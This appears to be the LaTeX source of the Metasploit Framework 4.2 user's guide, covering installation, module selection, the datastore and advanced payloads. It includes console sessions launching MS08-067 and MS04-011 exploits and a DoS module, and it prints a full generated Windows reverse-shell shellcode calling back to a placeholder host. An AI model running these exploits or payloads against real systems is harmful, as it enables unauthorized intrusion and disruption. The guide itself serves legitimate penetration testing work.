%%
% This file is part of the Metasploit Framework.
%%

%
%   Title: Metasploit Framework User's Guide
% Version: $Revision: 4068 $
%

\documentclass{report}
\usepackage{graphicx}
\usepackage{color}
\usepackage{amsmath}
\usepackage[colorlinks,urlcolor=blue,linkcolor=black,citecolor=blue]{hyperref}

\begin{document}

\title{Metasploit Framework User's Guide}
\author{metasploit.com}

\begin{titlepage}
    \begin{center}
        \huge{Metasploit Framework User's Guide}
		\ \\[10mm]
		\large{Version 4.2}
		\\[10mm]

        \includegraphics{hacker04.jpg}
		
		\ \\[10mm]
		
        \small{\url{http://metasploit.com}}

        \rule{10cm}{1pt} \\[4mm]
        \renewcommand{\arraystretch}{0.5}
    \end{center}
\end{titlepage}

\tableofcontents

\setlength{\parindent}{0pt} \setlength{\parskip}{8pt}

\chapter{Introduction}

\par
This is the official user guide for version 4.2 of the Metasploit Framework.
This guide is designed to provide an overview of what the framework is, how it
works, and what you can do with it. The latest version of this document can be
found on the Metasploit Framework web site.

\par
The Metasploit Framework is a platform for writing, testing, and using exploit
code. The primary users of Metasploit are professionals performing penetration
testing, shellcode development, and vulnerability research.

\par
\pagebreak

\chapter{Installation}

    \section{Installation on UNIX}
    \label{INSTALL-UNIX}

\par
Installing the Metasploit Framework is as easy as extracting the tarball,
changing into the created directory, and executing your preferred user
interface. We strongly recommend that you use a version of the Ruby interpreter
that was built with support for the GNU Readline library. If you are using the
Metasploit on Mac OS X prior to 10.5.1, you will need to install GNU
Readline\footnote{GNU Readline homepage:
\url{http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html}} and then
recompile the Ruby interpreter. Using a version of Ruby with Readline support
enables tab completion in the console interface. The \texttt{msfconsole} user
interface is preferred for everyday use, but \texttt{msfgui} can be useful for
those who prefer a graphical interface.

\par
To perform a system-wide installation, we recommend that you copy the entire
Metasploit root directory into a globally accessible location (e.g.
\texttt{/usr/local/msf}) and then create symbolic links from the \texttt{msf*}
applications to a directory in the system path (e.g. \texttt{/usr/local/bin}).
User-specific modules can be placed in \texttt{\$HOME/.msf4/modules}. The
structure of this directory should mirror that of the global modules directory
found in the framework distribution.

    \section{Installation on Windows}
    \label{INSTALL-WIN32}

\par
The Metasploit Framework is fully supported on the Windows platform. To install
Metasploit on Windows, download the latest version of the Windows installer from
\url{http://metasploit.com/download}, perform an online update, and launch the
\texttt{msfgui} interface from the Start Menu. To access a standard
\texttt{msfconsole} interface, select the Console option from the Window menu.

    \section{Platform Caveats}
    \label{INSTALL-CAVEAT}

\par
When using the Metasploit on the Windows platform, keep in mind that
\texttt{msfgui} is the only supported user interface. While \texttt{msfcli} may
appear to work on the command line, it will will run into trouble as soon as
more than one active thread is present. This can prevent most exploits,
auxiliary modules, and plugins from functioning. This problem does not occur
within Cygwin environment. The Windows platform does not support raw IP packet
injection, packet injection, wireless driver exploitation, or SMB relaying
attacks without specific configuration. In most cases, those features can be
accessed by running Metasploit inside of a Linux-based virtual machine (such as
BackTrack 3 in VMWare).

    \section{Minimum System Requirements}
    \label{INSTALL-REQUIRE}

\par
As a general guideline, your system should meet the minimum system requirements
described below:

\begin{itemize}
\item 2 GHz processor
\item 2 GB available RAM (4 GB is recommended)
\item 500MB available disk space
\item 10/100 Mb/s NIC
\end{itemize}

    \section{Supported Operating Systems}
    \label{INSTALL-SUPPORT}

\par
The Metasploit Framework should run on almost any UNIX-based operating system
that includes a complete and modern version of the Ruby interpreter (1.8.6+).
Every stable version of Metasploit is tested with three primary platforms:

\begin{itemize}
\item Linux kernel 2.6 (x86, x86\_64, PPC)
\item Windows NT (XP, 2003 Server, Vista, 2008 Server, Windows 7)
\item Mac OS X 10.5 (x86, x86\_64, PPC)\footnote{Some users have experienced
      occasional problems while trying to install Metasploit on Mac OS X.
      While it is a supported platform, most of the problems are related to
      PostgreSQL and the pg gem. If you have trouble during the installation,
      take a look at
      \url{http://dl.dropbox.com/u/1440188/msf\%20in\%20osx\%20with\%20armitage.pdf}}
\end{itemize}

\par
For small to medium-scale penetration tests, both Linux-based and Windows
platforms perform about the same. If you are conducting a large-scale
penetration test (10,000+ hosts), we recommend using the Metasploit Framework
on a Linux-based operating system as it is more scalable and copes better with
expanding use.\footnote{See Christian Kirsch's post on the subject:
\url{https://community.rapid7.com/message/1988}}

\par
For information about manually installing Metasploit, including all of the
required dependencies needed to use the new \texttt{msfgui} interface, please
see the Metasploit support site at \url{http://metasploit.com/get-support}.

    \section{Updating the Metasploit Framework}
    \label{INSTALL-UPDATE}

\par
The Metasploit Framework can be updated using a Subversion client. The old
\texttt{msfupdate} tool is no longer supported. Windows users can click on the
\textit{Online Update} link within the \textit{Metasploit 4} program folder in
the Start Menu. To obtain the latest updates on a UNIX-like platform, move to
the Metasploit root directory and execute \texttt{svn update}. If you are
accessing the Internet through an HTTP proxy server, please see the Subversion
FAQ for proxy access at \url{http://subversion.apache.org/faq.html#proxy}.

\pagebreak

\chapter{Getting Started}

    \section{The Console Interface}
    \label{STARTED-CONSOLE}

\par
After you have installed Metasploit, you should verify that everything is
working properly. The easiest way to do this is to execute the
\texttt{msfconsole} user interface. If you are using Windows, start the
\texttt{msfgui} interface and access the \texttt{Console} link from the Window
menu. The console should display an ASCII art logo, print the current version,
some module counts, and drop to a \texttt{msf> } prompt. From this prompt, type
\texttt{help} to get a list of valid commands. You are currently in the "main"
mode; this allows you to list exploits, list payloads, and configure global
options. To list all available exploits, type \texttt{show exploits}. To obtain
more information about a given exploit, type \texttt{info module\_name}.

\par
The console interface was designed to be flexible and fast. If you enter a
command that is not recognized by the console, it will scan the system path to
determine if it is a system command. If it finds a match, that command will be
executed with the supplied arguments. This allows you to use your standard set
of tools without having to leave the console. The console interface also
supports tab completion of known commands if Ruby was built with the GNU
Readline library. For more information on tab completion, please refer to
appendix \ref{REF-TAB}.

\par
The console startup will similar to the text below.

\begin{verbatim}






 _                                                      _
/  \  / \        __                          _   __    /_/ __
| |\ /  | _____  \ \            ___   _____ | | /   \  _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | | | |  || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | |_ \__/ | |  | |_
      |/  |____/  \___\/ /\  \___/   \/      \__|     |_\  \___\

       =[ msf v4.2.0-release
+ -- --=[ 786 exploits - 424 auxiliary - 127 post
+ -- --=[ 238 payloads - 27 encoders - 8 ops

msf >
\end{verbatim}

    \section{The GUI Interface}
    \label{STARTED-GUI}

\par
The \texttt{msfgui} interface provides the same functionality of
\texttt{msfconsole} with all the extras benefits of a graphical user interface.

\par
To search for a module within the module tree, enter a string or regular
expression into the search box and click the button labeled \textit{Find}. All
matching modules will appear in the tree below. To execute a module,
double-click its name in the tree or right-click its name and select the
\textit{Execute} option. To view the source code for a particular module,
right-click its name and select the \textit{View Code} option.

\par
Once a module is selected, a wizard-based interface will walk you through the
process of configuring and launching the module. In the case of exploit modules,
the output from the module will appear in the main window under the
\textit{Module Output} tab. Any sessions created by the module will appear in
the \textit{Sessions} view in the main window. To access a session, double-click
the session name in the view or open a \textit{Console} and use the
\texttt{sessions} command to interact with the shell. Meterpreter sessions will
spawn a shell when double-clicked and also offer a process and file browser via
the right-click context menu.

\par
To run an instance of \texttt{msfconsole} from within the GUI, select the
\textit{Console} option from the \textit{Window} menu.

    \section{The Command Line Interface}
    \label{STARTED-CLI}

\par
If you are looking for a way to automate exploit testing, or simply do not want
to use an interactive interface, then \texttt{msfcli} may be the solution.
\footnote{The \texttt{msfcli} interface does not work properly with the native
Windows version of Ruby.} This interface takes a module name as the first
parameter, followed by the options in a VAR=VAL format, and finally an action
code to specify what should be done. The module name is used to determine which
exploit or auxiliary module you want to launch.

\par
The action code is a single letter; S for summary, O for options, A for advanced
options, I for IDS evasions, P for payloads, T for targets, AC for auxiliary
actions, C to try a vulnerability check, and E to exploit. The saved datastore
will be loaded and used at startup, allowing you to configure convenient default
options in the global or module-specific datastore of \texttt{msfconsole}, save
them, and take advantage of them in the \texttt{msfcli} interface. The
\texttt{msfcli} interface will also work with auxiliary modules.

\pagebreak

\chapter{Using the Metasploit Framework}

	\section{Choosing a Module}

\par
From the \texttt{msfconsole} interface, you can view the list of modules that
are available for you to interact with. You can see all available modules
through the \texttt{show all} command. To see the list of modules of a
particular type you can use the \texttt{show moduletype} command, where
\textit{moduletype} is any one of exploits, encoders, payloads, and so on. You
can select a module with the \texttt{use} command by specifying the module's
name as the argument. The \texttt{info} command can be used to view information
about a module without using it.

	\section{Exploit Modules}

\par
Exploit modules are the de facto module in Metasploit which are used to
encapsulate an exploit.

		\subsection{Configuring the Active Exploit}

\par
Once you have selected an exploit with the \texttt{use} command, the next step
is to determine what options it requires. This can be accomplished with the
\texttt{show options} command. Most exploits use \texttt{RHOST} to specify the
target address and \texttt{RPORT} to set the target port. Use the \texttt{set}
command to configure the appropriate values for all required options. If you
have any questions about what a given option does, refer to the module source
code. Advanced options are available with some exploit modules, these can be
viewed with the \texttt{show advanced} command. Options useful for IDS and IPS
evasion can be viewed with the \texttt{show evasion} command.

		\subsection{Verifying the Exploit Options}

\par	
The \texttt{check} command can be used to determine whether the target system is
vulnerable to the active exploit module. This is a quick way to verify that all
options have been correctly set and that the target is actually vulnerable to
exploitation. Not all exploit modules have implemented the check functionality.
In many cases it is nearly impossible to determine whether a service is
vulnerable without actually exploiting it. A \texttt{check} command should never
result in the target system crashing or becoming unavailable. Many modules
display version information and expect you to analyze it before proceeding.

		\subsection{Selecting a Target}

\par
Many exploits will require the \texttt{TARGET} environment variable to be set to
the index number of the desired target. The \texttt{show targets} command will
list all targets provided by the exploit module. Many exploits will default to a
brute-force target type; this may not be desirable in all situations.

		\subsection{Selecting the Payload}

\par
The payload is the actual code that will run on the target system after a
successful exploit attempt. Use the \texttt{show payloads} command to list all
payloads compatible with the current exploit. If you are behind a firewall, you
may want to use a bind shell payload, if your target is behind one and you are
not, you would use a reverse connect payload. You can use the
\texttt{info payload\_name} command to view detailed information about a given
payload.

\par
Once you have decided on a payload, use the \texttt{set} command to specify the
payload module name as the value for the \texttt{PAYLOAD} environment variable.
Once the payload has been set, use the \texttt{show options} command to display
all available payload options. Most payloads have at least one required option.
Advanced options are provided by a handful of payload options; use the
\texttt{show advanced} command to view these. Please keep in mind that you will
be allowed to select any payload compatible with that exploit, even if it not
compatible with your currently selected \texttt{TARGET}. For example, if you
select a Linux target, yet choose a BSD payload, you should not expect the
exploit to work.

		\subsection{Launching the Exploit}

\par
The \texttt{exploit} command will launch the attack. If everything went well,
your payload will execute and potentially provide you with an interactive
command shell on the exploited system.

	\section{Auxiliary Modules}

\par
Auxiliary modules are used to perform arbitrary, ``one-off'' actions that are
not necessarily related to exploitation. For example, port scanning, denial of
service, fuzzing, etc.
	
		\subsection{Running an Auxiliary Task}

\par
Auxiliary modules are quite a bit similar to exploit modules. Instead of having
targets, they have actions, which are specified through the \texttt{ACTION}
option. To run an auxiliary module, you can either use the \texttt{run} command,
or you can use the \texttt{exploit} command -- they're both the same thing.

\begin{verbatim}
msf > use dos/windows/smb/ms06_035_mailslot
msf auxiliary(ms06_035_mailslot) > set RHOST 1.2.3.4
RHOST => 1.2.3.4
msf auxiliary(ms06_035_mailslot) > run
[*] Mangling the kernel, two bytes at a time...
\end{verbatim}

	\section{Payload Modules}

\par
Payload modules encapsulate the arbitrary code (shellcode) that is executed as
the result of an exploit succeeding. Payloads typically build a communication
channel between Metasploit and the victim host.

		\subsection{Generating a Payload}

\par
The console interface supports generating different forms of a payload. To
generate payloads, first select a payload using the \texttt{use} command.

\begin{verbatim}
msf > use windows/shell_reverse_tcp
msf payload(shell_reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'
    -e <opt>  The name of the encoder module to use.
    -h        Help banner.
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -s <opt>  NOP sled length.
    -t <opt>  The output type: ruby, perl, c, or raw.

msf payload(shell_reverse_tcp) >
\end{verbatim}

\par
Using the options supported by the \texttt{generate} command, different formats
of a payload can be generated. Some payloads will require options which can be
specified through the \texttt{-o} parameter. Additionally, a format to convey
the generated payload can be specified through the \texttt{-t} parameter. To
save the resulting data to a local file, pass the \texttt{-f} parameter followed
by the output file name.

\begin{verbatim}
msf payload(shell_reverse_tcp) > set LHOST 1.2.3.4
LHOST => 1.2.3.4
msf payload(shell_reverse_tcp) > generate -t ruby
# windows/shell_reverse_tcp - 287 bytes
# http://www.metasploit.com
# EXITFUNC=seh, LPORT=4444, LHOST=1.2.3.4
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24" +
"\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f" +
"\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84" +
"\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28" +
"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c" +
"\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" +
"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" +
"\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" +
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50" +
"\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff" +
"\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43" +
"\x53\x43\x53\xff\xd0\x68\x01\x02\x03\x04\x66\x68\x11\x5c" +
"\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff\xd6\x6a" +
"\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a\x50" +
"\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95" +
"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" +
"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51" +
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05" +
"\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6" +
"\x79\xff\x75\x04\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a" +
"\x04\x5f\x53\xff\xd6\xff\xd0"
msf payload(shell_reverse_tcp) >
\end{verbatim}

	\section{Nop Modules}

\par
NOP modules are used to generate no-operation instructions that can be used for
padding out buffers.

		\subsection{Generating a NOP Sled}

\par
The NOP module console interface supports generating a NOP sled of an arbitrary
size and displaying it in a given format through the \texttt{generate} command.

\begin{verbatim}
msf > use x86/opty2
msf nop(opty2) > generate -h
Usage: generate [options] length

Generates a NOP sled of a given length.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'
    -h        Help banner.
    -s <opt>  The comma separated list of registers to save.
    -t <opt>  The output type: ruby, perl, c, or raw.

msf nop(opty2) >
\end{verbatim}

\par
To generate a 50 byte NOP sled that is displayed as a C-style buffer, the
following command can be run:

\begin{verbatim}
msf nop(opty2) > generate -t c 50
unsigned char buf[] =
"\xf5\x3d\x05\x15\xf8\x67\xba\x7d\x08\xd6\x66\x9f\xb8\x2d\xb6"
"\x24\xbe\xb1\x3f\x43\x1d\x93\xb2\x37\x35\x84\xd5\x14\x40\xb4"
"\xb3\x41\xb9\x48\x04\x99\x46\xa9\xb0\xb7\x2f\xfd\x96\x4a\x98"
"\x92\xb5\xd4\x4f\x91";
msf nop(opty2) >
\end{verbatim}

\pagebreak

\chapter{The Datastore}

\par
The datastore is a dynamic table of named values (much like a hash) that lets
the user alter the behavior of certain components of the Metasploit Framework.
The various components use it to configure settings, patch opcodes, define
parameters, pass options between modules, etc. There are two different types of
datastores: the \textit{global} and \textit{module} datastores. The only
difference being the scope in which their settings can be seen.

\par
When Metasploit looks for a variable (e.g. \texttt{RHOST} or \texttt{THREADS})
it searches for it in the current module's datastore first. If it can't be found, 
the global datastore is then searched last.

    \section{Global Datastore}
    \label{ENV-GLOBAL}

\par
The contents of the global datastore are applied to all modules. For instance,
if the \texttt{RHOSTS} variable is set in the global datastore, the same value
will be used no matter what module is currently being used.

\par
The global datastore is accessed through \texttt{msfconsole} using the
\texttt{setg} and \texttt{unsetg} commands. Calling \texttt{setg} with one
argument shows the current value of that option (if it exists). If no arguments
are given, then the entire contents of the global datastore will be displayed.

\begin{verbatim}
msf > setg

Global
======

No entries in data store.

\end{verbatim}

\par
As you can, the global datastore is initially empty by default. We'll explain
in a little bit how to save these settings to disk so that they're loaded when
\texttt{msfconsole} starts.

    \section{Module Datastore}
    \label{ENV-TEMP}

\par
The contents of the module datastore are only applicable to the currently loaded
module. Switching to another module via the \texttt{use} command will result in
the datastore for the current module being swapped out with the datastore of the
new module.

\par
The module datastore is accessed through the \texttt{set} and \texttt{unset}
commands. Calling \texttt{set} with one argument shows the current value of that
option (if it exists). If no arguments are given, then the entire contents of
the module datastore will be displayed. If no module is currently active, the
\texttt{set} and \texttt{unset} commands will operate in the context of the
global datastore.

\par
Consider the following example, using the \texttt{windows/smb/ms08\_067\_netapi}
module.

{\footnotesize
\begin{verbatim}
msf  exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf  exploit(ms08_067_netapi) > set RHOST 192.168.1.156
RHOST => 192.168.1.156
msf  exploit(ms08_067_netapi) >
\end{verbatim}
}

% TODO Fix this paragraph so that the string windows/smb/smb_relay
%      does not stick out into the right margin

\par
At this point, if you decided to use another module instead - say
\texttt{windows/smb/smb\_relay} - the \texttt{RHOST} variable would no longer
retain its value since it was stored in the datastore for
\texttt{windows/smb/ms08\_067\_netapi}.

\par
As noted earlier, Metasploit queries the module datastore first when searching
for an option or variable. If none is found, then the global datastore is
searched. This means that if a variable like \texttt{RHOST} is set in both the
module and global datastores, the value of \texttt{RHOST} in the module
datastore will take precedence. This behavior allows you to effectively mask or
alias variables and options set in the global datastore.

    \section{Saving the Datastore}
    \label{ENV-SAVE}

\par
Sometimes it can become quite tedious to constantly set a variable that you
use reguarly. This is where the \texttt{save} command comes in. The
\texttt{save} command can be used to serialize the global and all module
datastores to disk. The saved environment is written to
\texttt{\$HOME/.msf4/config} and will be loaded when any of the user interfaces
are executed.

    \section{Datastore Efficiency}
    \label{ENV-EFF}

\par
This split datastore system allows you save time during exploit development
and penetration testing. Common options between exploits can be defined in the
global datastore once and automatically used in any exploit you load thereafter.

\par
The example below shows how setting the \texttt{LPORT}, \texttt{LHOST}, and
\texttt{PAYLOAD} variables in the global datastore can save you time when
exploiting a set of Windows-based targets. If this datastore was set and a Linux
exploit was being used, the module datastore could be used (via \texttt{set} and
\texttt{unset}) to override these defaults.

{\footnotesize
\begin{verbatim}
f > setg LHOST 192.168.0.10
LHOST => 192.168.0.10
msf > setg LPORT 4445
LPORT => 4445
msf > setg PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > show options

Module options:

...

Payload options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.0.10     yes       The local address
   LPORT     4445             yes       The local port

...

\end{verbatim}}

    \section{Datastore Variables}
    \label{ENV-VAR}

\par
The datastore can be used to configure many aspects of the Metasploit Framework,
ranging from user interface settings to specific timeout options in the network
socket API. This section describes the most commonly used environment variables.

	\subsection{LogLevel}

\par
The \texttt{LogLevel} variable is used to control the verbosity of log messages
provided by the various components of the framework. If this variable is not
set, logging will be disabled. Setting this variable to \texttt{0} will turn on
default log messages. A value of \texttt{1} will enable additional, non-verbose
log messages that may be helpful while troubleshooting. A value of \texttt{2}
will enable verbose debug logging. A value of \texttt{3} will enable all logging
and may generate a large amount of log messages. Use this only when much
additional information is required. Log files are stored in the
\texttt{\$HOME/.msf4/logs} directory.

	\subsection{MsfModulePaths}

\par
The \texttt{MsfModulePaths} variable can be used to add additional directories
from which to load modules. By default, Metasploit will load modules from the
\texttt{modules} directory in the Metasploit root directory. It will also load
modules from \texttt{\$HOME/.msf4/modules} if such a path exists.

\pagebreak

\chapter{Advanced Features}

\par
This section covers some of the advanced features that can be found in this
release. These features can be used in any compatible exploit and highlight the
strength of developing attack code using an exploit framework.

\section{The Meterpreter}

\par
The Meterpreter is an advanced multi-function payload that can be dynamically
extended at run-time. In normal terms, this means that it provides you with a
basic shell and allows you to add new features to it as needed. Please refer to
the Meterpreter documentation for an in-depth description of how it works and
what you can do with it. The Meterpreter manual is available online at
\url{http://dev.metasploit.com/documents/meterpreter.pdf}.

\section{PassiveX Payloads}

\par
The Metasploit Framework can be used to load arbitrary ActiveX controls into a
target process. This feature works by patching the registry of the target system
and causing the exploited process to launch Internet Explorer with a URL
pointing back to attacker's machine. Metasploit starts up a simple web server
that accepts the request and sends back a web page instructing it to load an
ActiveX component. The exploited system then downloads, registers, and executes
the ActiveX control.

\par
The basic PassiveX payload, \texttt{windows/xxx/reverse\_http}, supports any
custom ActiveX that you develop. In addition to the base payload, three other
PassiveX modules are included in the framework. These can be used to execute a
command shell, load the Meterpreter, or inject a VNC service. When any of these
three payloads are used, the PassiveX object will emulate a TCP connection
through HTTP GET and POST requests. This allows you to interact with a command
shell, VNC, or the Meterpreter using nothing but standard HTTP traffic.

\par
Since PassiveX uses the Internet Explorer browser to load the ActiveX component,
it will pass right through an outbound web proxy, using whatever system and
authentication settings that have already been configured. The PassiveX payloads
will only work when the target system has Internet Explorer 6.0 installed (not
5.5 or 7.0). For more information about PassiveX, please see the Uninformed
Journal article titled "Post-Exploitation on Windows using ActiveX Controls",
located online at \url{http://www.uninformed.org/?v=1&a=3&t=pdf}.

\section{Chainable Proxies}

\par
Metasploit includes transparent support for TCP proxies, this release has
handler routines for HTTP CONNECT and SOCKSv4 servers. To use a proxy with a
given exploit, the \texttt{Proxies} environment variable needs to be set. The
value of this variable is a comma-separated list of proxy servers, where each
server is in the format type:host:port. The type values are 'http' for HTTP
CONNECT and 'socks4' for SOCKS v4. The proxy chain can be of any length; testing
shows that the system was stable with over five hundred SOCKS and HTTP proxies
configured randomly in a chain. The proxy chain only masks the exploit request,
the automatic connection to the payload is not relayed through the proxy chain
at this time.

\section{Win32 UploadExec Payloads}

\par
Although UNIX systems normally include all of the tools you need for
post-exploitation, Windows systems are notoriously lacking in a decent command
line toolkit. The windows/upexec/* payloads included in this release allow you
to simultaneously exploit a Windows system, upload your favorite tool, and
execute it, all across the payload socket connection. When combined with a
self-extracting rootkit or scripting language interpreter (perl.exe!), this can
be a very powerful feature. The Meterpreter payloads are usually much better
suited for penetration testing tasks.

\section{Win32 DLL Injection Payloads}

\par
Metasploit includes a staged payload that is capable of injecting a custom
DLL into memory in combination with any Win32 exploit. This payload will not
result in any files being written to disk; the DLL is loaded directly into
memory and is started as a new thread in the exploited process. This payload was
developed by Jarkko Turkulainen and Matt Miller and is one of the most powerful
post-exploitation techniques developed to date. To create a DLL which can be
used with this payload, use the development environment of choice and build a
standard Win32 DLL. This DLL should export an function called Init which takes a
single argument, an integer value which contains the socket descriptor of the
payload connection. The Init function becomes the entry point for the new thread
in the exploited process. When processing is complete, it should return and
allow the loader stub to exit the process according to the \texttt{EXITFUNC}
environment variable. If you would like to write your own DLL payloads, refer to
the \texttt{external/source/dllinject} directory in the Metasploit root
directory. In addition to normal DLL injection, Metasploit also supports
Reflective DLL Injection payloads as well. For more information about Reflective
DLL Injection, please see the Harmony Security paper, located at
\url{http://www.harmonysecurity.com/files/HS-P005\_ReflectiveDllInjection.pdf}.

\section{VNC Server DLL Injection}

\par
One of the first DLL injection payloads developed was a customized VNC server.
This server was written by Matt Miller and based on the RealVNC source code.
Additional modifications were made to allow the server to work with exploited,
non-interactive network services. This payload allows you to immediately access
the desktop of an exploited system using almost any Win32 exploit. The DLL is
loaded into the remote process using any of the staged loader systems, started
up as a new thread in the exploited process, and the listens for VNC client
requests on the same socket used to load the DLL. Metasploit listens on a local
socket for a VNC client and proxies data across the payload connection to the
server.

\par
The VNC server will attempt to obtain full access to the current interactive
desktop. If the first attempt fails, it will call \texttt{RevertToSelf()} and
then try the attempt again. If it still fails to obtain full access to this
desktop, it will fall back to a read-only mode. In read-only mode, the user can
view the contents of the desktop, but not interact with it. If full access was
obtained, the VNC server will spawn a command shell on the desktop with the
privileges of the exploited service. This is useful in situations where an
unprivileged user is on the interactive desktop, but the exploited service is
running with System privileges.

\par
If there is no interactive user logged into the system or the screen has been
locked, the command shell can be used to launch explorer.exe anyways. This can
result in some very confused users when the logon screen also has a Start Menu.
If the interactive desktop is changed, either through someone logging into the
system or locking the screen, the VNC server will disconnect the client. Future
versions may attempt to follow a desktop switch.

\par
To use the VNC injection payloads, specify the full path to the VNC server as
the value of the \texttt{DLL} option. The VNC server can be found in the
\texttt{data} subdirectory of the Metasploit root directory and is named
\texttt{vncdll.dll}. The source code of the DLL can be found in
\texttt{external/source/vncdll}.

\par
There are a few situations where the VNC inject payload will simply not work.
These problems are often cause by strange execution environments or other issues
related to a specific exploit or injection method. These issues will be
addressed as time permits:

\begin{itemize}
	\item The windows/brightstor/universal\_agent exploit will cause the VNC
    payload to crash, possibly due to a strange heap state.
\end{itemize}

\begin{verbatim}
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > set RHOST some.vuln.host
RHOST => some.vuln.host
msf exploit(ms04_011_lsass) > set PAYLOAD windows/vncinject/reverse_tcp
PAYLOAD => windows/vncinject/reverse_tcp
msf exploit(ms04_011_lsass) > set LHOST your.own.ip
LHOST => your.own.ip
msf exploit(ms04_011_lsass) > set LPORT 4321
LPORT => 4321
msf exploit(ms04_011_lsass) > exploit
\end{verbatim}

If the \texttt{vncviewer} application is in your path and the AUTOVNC option has
been set (it is by default), Metasploit will automatically open the VNC desktop.
If you would like to connect to the desktop manually, \texttt{set AUTOVNC 0},
then use \texttt{vncviewer} to connect to 127.0.0.1 on port 5900.

\pagebreak

\chapter{More Information}

\section{Web Site}

\par
The metasploit.com web site is the first place to check for updated modules and
new releases. This web site also hosts the Opcode Database and a decent
shellcode archive.

\section{Mailing List}

\par
Metasploit hosts the \texttt{framework} mailing list for general discussion and
help. To subscribe to the mailing list, visit
\url{http://mail.metasploit.com/mailman/listinfo/framework}. Additionally, the
\texttt{framework} archives can be viewed at
\url{http://mail.metasploit.com/pipermail/framework}.

\section{Developers}

\par
If you are interested in helping out with the Metasploit Project, or have any
questions related to module development, please contact the development team.
The Metasploit Framework development team can be reached at
msfdev[at]metasploit.com.

\pagebreak

\appendix

\pagebreak

\chapter{Security}

\par
We recommend that you use a robust, secure terminal emulator when utilizing the
command-line interfaces. Examples include \texttt{konsole},
\texttt{gnome-terminal}, and recent versions of \texttt{PuTTY}.

	\section{Console Interfaces}

\par
The console does not perform terminal escape sequence filtering, this could
allow a hostile network service to do Bad Things (TM) to your terminal emulator
when the exploit or check commands are used. We suggest that you use a terminal
emulator which limits the functionality available through hostile escape
sequences. For more information on this topic, please see the Terminal Emulator
Security Issues paper at
\url{http://marc.info/?l=bugtraq&m=104612710031920&q=p3}.

\pagebreak

\chapter{General Tips}

	\section{Tab Completion}
	\label{REF-TAB}

\par
On the UNIX and Cygwin platforms, tab completion depends on the existence of the
GNU Readline library when Ruby was compiled. Some operating systems, such as Mac
OS X, have included a version of Ruby without this support. To solve this
problem, grab the latest version of the GNU Readline library, configure, build,
and install it. Then grab the latest version of the Ruby interpreter and do the
same. The resulting Ruby binary can be used to start the \texttt{msfconsole}
interface with full tab completion of known commands.

	\section{Secure Socket Layer}
	\label{REF-SSL}

\par
Nearly all TCP-based exploit and auxiliary modules have builtin support for the
Secure Sockets Layer. This is a feature of the Socket class included with the
Rex library. To indicate that all connections should use SSL, set the
\texttt{SSL} environment variable to \texttt{true} from within the console
interface. Keep in mind, that in most cases the default \texttt{RPORT} variable
will need to be changed as well. For example, when exploiting a web application
vulnerability through SSL, the \texttt{RPORT} variable should be set to
\texttt{443}.

\pagebreak

\chapter{Licenses}

\par
The Metasploit Framework is distributed under the terms of a modified-BSD
license defined below.

{\footnotesize
\begin{verbatim}
Copyright (c) 2008, Rapid7 LLC
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	  this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	  this list of conditions and the following disclaimer in the documentation
	  and/or other materials provided with the distribution.

    * Neither the name of Rapid7 LLC nor the names of its contributors
	  may be used to endorse or promote products derived from this software
	  without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
